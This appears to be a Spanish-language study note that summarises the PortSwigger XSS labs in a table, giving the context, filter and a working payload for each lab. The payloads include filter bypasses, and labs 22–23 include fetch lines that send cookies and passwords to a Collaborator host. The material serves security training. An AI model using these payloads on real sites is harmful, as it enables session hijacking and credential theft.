---
aliases:
  - XSS labs
  - Cross-Site Scripting labs
  - xss-labs
tags:
  - vuln/xss
  - labs
  - portswigger
---

# XSS — Labs de PortSwigger (Apprentice + Practitioner)

Tabla resumen de los labs de XSS **Apprentice y Practitioner** (se omiten los **Expert**), en el **mismo orden** que la [Web Security Academy](https://portswigger.net/web-security/all-labs#cross-site-scripting-xss).

La idea es un **pantallazo de en qué hacer foco**: qué **tipo** de XSS es, **dónde** cae el input (buscador, comentario, `href`, jQuery…), **qué contexto** hay que romper, y —cuando el lab lo pide— **qué se busca obtener** (PoC `alert`, robar cookie, credenciales, bypass CSRF) y **qué ofuscación** usar.

> **Base común de todo XSS:** inyectá un canario (`xss123`), buscalo en la respuesta, **identificá el contexto** de cada reflejo y diseñá el *breakout*. Lo que cambia entre labs es el **contexto** y el **filtro**. Metodología completa → [[vulnerabilities/002-xss/README|entry point]].

## Apprentice

| #   | Laboratorio | Tipo / Dónde cae | Foco: qué romper, qué obtener, diferenciador |
| --- | ----------- | ---------------- | -------------------------------------------- |
| 1 | [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded) | Reflected · **buscador**, HTML crudo | El caso base: sin filtro. `<script>alert(1)</script>` en la búsqueda. **Foco:** confirmar reflejo en contexto HTML. |
| 2 | [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded) | Stored · **comentario** de blog, HTML crudo | `<script>alert(1)</script>` en el comentario → se dispara cuando **otro** carga el post. **Foco:** persistente, la víctima llega sola. |
| 3 | [DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink) | DOM · buscador, sink `document.write` | El término va a `document.write` (dentro de un `<img src>`). `"><svg onload=alert(1)>`. **Foco:** source `location.search` → sink `document.write`. |
| 4 | [DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink) | DOM · buscador, sink `innerHTML` | `innerHTML` **no ejecuta `<script>`** → `<img src=1 onerror=alert(1)>`. **Foco / diferencia:** el sink obliga a usar event handler, no `<script>`. |
| 5 | [DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink) | DOM · jQuery `attr('href', …)` (link "back") | El source va al `href` de un `<a>` vía jQuery. Payload `javascript:alert(1)`. **Foco:** sink = atributo `href` → protocolo `javascript:`. |
| 6 | [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event) | DOM · jQuery `$(location.hash)`, evento `hashchange` | Hay que **entregarlo por iframe** que cambie el hash: `<iframe src="…#" onload="this.src+='<img src=x onerror=print()>'">`. **Foco / diferencia:** requiere `hashchange` → entrega vía iframe. Ver [ejemplo-iframe.html](../ejemplo-iframe.html). |
| 7 | [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded) | Reflected · dentro de un **atributo**, `<>` codificados | No podés abrir tags → romper la comilla + **event handler**: `"><` no sirve; usar `" autofocus onfocus="alert(1)`. **Foco:** contexto atributo → event handler. |
| 8 | [Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded) | Stored · input → `href` de un `<a>`, `"` codificada | La web va al `href` de un comentario. `"` codificada → usar **URL** `javascript:alert(1)`. **Foco:** protocolo `javascript:` en el href. |
| 9 | [Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded) | Reflected · dentro de un **string JS**, `<>` codificados | Romper el string: `'-alert(1)-'` o `';alert(1)//`. **Foco:** contexto JS string, breakout con comilla (sin usar `<>`). |

## Practitioner

| #   | Laboratorio | Tipo / Dónde cae | Foco: qué romper, qué obtener, diferenciador |
| --- | ----------- | ---------------- | -------------------------------------------- |
| 10 | [DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element) | DOM · dentro de un `<select>` (stock checker) | Cerrar el `<select>` primero: `"></select><img src=1 onerror=alert(1)>`. **Foco / diferencia:** escapar del elemento contenedor antes del payload. |
| 11 | [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression) | DOM · **AngularJS** (`ng-app`), buscador | Sin `<>` ni `"`: inyectar **expresión Angular** `{{$on.constructor('alert(1)')()}}`. **Foco / diferencia:** no es HTML, es sandbox de AngularJS. |
| 12 | [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected) | Reflected DOM · buscador, la respuesta pasa por `eval` | La respuesta JSON reflejada se procesa con `eval`: `\"-alert(1)}//`. **Foco:** el source es una **respuesta reflejada** evaluada por JS del cliente. |
| 13 | [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored) | Stored DOM · comentario, sink JS (`.innerHTML`/jQuery `html()`) | El comentario guardado se pinta con un sink DOM: `<><img src=x onerror=alert(1)>`. **Foco / diferencia:** stored **+** sink en el cliente. |
| 14 | [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked) | Reflected · buscador, **WAF** bloquea casi todo | **Fuzzear** con Intruder qué tag/evento pasa → `<TAG onEVENT=...>`; entregar a la **víctima** por exploit server. **Foco:** descubrir el tag/evento permitido y entregarlo. |
| 15 | [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked) | Reflected · solo **custom tags** permitidos | `<xss id=x onfocus=alert(document.cookie) tabindex=1></xss>` + `#x` en la URL para autoenfocar. Entregar a la víctima. **Foco:** custom tag + `onfocus` + fragmento `#id`. |
| 16 | [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed) | Reflected · solo algunos tags/atributos **SVG** | Fuzzear SVG permitido: `<svg><animatetransform onbegin=alert(1)>`. **Foco / diferencia:** el filtro deja pasar un subconjunto de SVG. |
| 17 | [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag) | Reflected · dentro de `<link rel=canonical href=…>` | No hay contenido → inyectar atributo + **accesskey**: `'accesskey='x'onclick='alert(1)`; la víctima pulsa `ALT+SHIFT+X`. **Foco:** vector en un `<link>` sin cuerpo. |
| 18 | [Reflected XSS into a JS string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped) | Reflected · string JS, `'` y `\` escapados | No podés escapar la comilla → **salir del bloque**: `</script><script>alert(1)</script>`. **Foco / diferencia:** cuando escapan comillas, cerrás el `<script>` entero. |
| 19 | [Reflected XSS into a JS string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped) | Reflected · string JS, `'` escapada pero `\` **no** filtrado | El backslash no se filtra → anulás el escape: `\'-alert(1)//`. **Foco / diferencia:** aprovechar que `\` pasa sin filtrar. |
| 20 | [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped) | Stored · dentro de un handler `onclick` | En atributos HTML las **entidades se decodifican**: `&apos;-alert(1)-&apos;` (o `http://x?&apos;-alert(1)-&apos;`). **Foco / diferencia:** bypass con HTML entities dentro del atributo. |
| 21 | [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped) | Reflected · **template literal** `` `…` `` | Todo escapado, pero dentro de `${}` se ejecuta: `${alert(1)}`. **Foco / diferencia:** el template literal evalúa `${}` sin necesitar romper comillas. |
| 22 | [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies) | Stored · **objetivo: robar cookie** | `<script>fetch('https://COLLAB/?'+document.cookie)</script>` → tomás la sesión de la víctima. **Foco:** de PoC a **session hijacking** real (Collaborator). |
| 23 | [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords) | Stored · **objetivo: robar credenciales** | Inyectar form falso; el gestor de contraseñas autocompleta y se exfiltra: `<input name=username><input type=password onchange=fetch('https://COLLAB',{method:'POST',body:this.value})>`. **Foco:** abusar del **autofill**. |
| 24 | [Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf) | Stored · **objetivo: bypass CSRF** | El XSS **lee el CSRF token** de `/my-account` y hace el POST de cambio de email en nombre de la víctima. **Foco:** XSS → leer token → forjar request (el token deja de proteger). |
| 25 | [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack) | Reflected · **CSP estricto**, *scriptless* | La CSP impide ejecutar JS → **dangling markup** para exfiltrar el CSRF token y cambiar el email. **Foco / diferencia:** explotar **sin ejecutar JS**. |

---

## Cómo leer esta tabla / atajos mentales

- **Todo XSS = contexto + filtro.** Primero identificá **dónde cae** tu input (HTML / atributo / string JS / template literal / URL / dentro de otro tag), después qué **filtro** hay. El *breakout* sale del contexto.
- **Reflected vs Stored vs DOM:**
  - *Reflected* → el payload va en la request y vuelve; **hay que entregárselo a la víctima** (labs 14, 15, 25 usan exploit server).
  - *Stored* → se guarda (comentario) y se dispara solo cuando la víctima carga la página.
  - *DOM* → el sink está en el **JS del cliente**; seguí **source → sink** (labs 3-6, 10-13). Usá **DOM Invader**.
- **Sinks que NO ejecutan `<script>`** (`innerHTML`, lab 4/13) → usá `<img src=x onerror=...>` / `<svg onload=...>`.
- **Contexto de atributo / comillas escapadas** (labs 7, 18, 19, 20) → event handler, salir del `<script>`, anular el escape con `\`, o HTML entities. **El truco cambia según qué carácter lograron filtrar.**
- **Filtro de tags/eventos** (labs 14-17) → **fuzzear** con Intruder + listas de la [cheat-sheet.md](../cheat-sheet.md); custom tags, SVG, `accesskey`.
- **Frameworks** (lab 11 AngularJS) → no pienses en HTML, pensá en **expresión del framework**.
- **Explotación real** (labs 22-25) → cookie, credenciales, CSRF bypass, dangling markup bajo CSP. El *cómo* weaponizar está en el [[vulnerabilities/002-xss/README#🎯 Qué hacer con un XSS (objetivos de explotación)|entry point]].
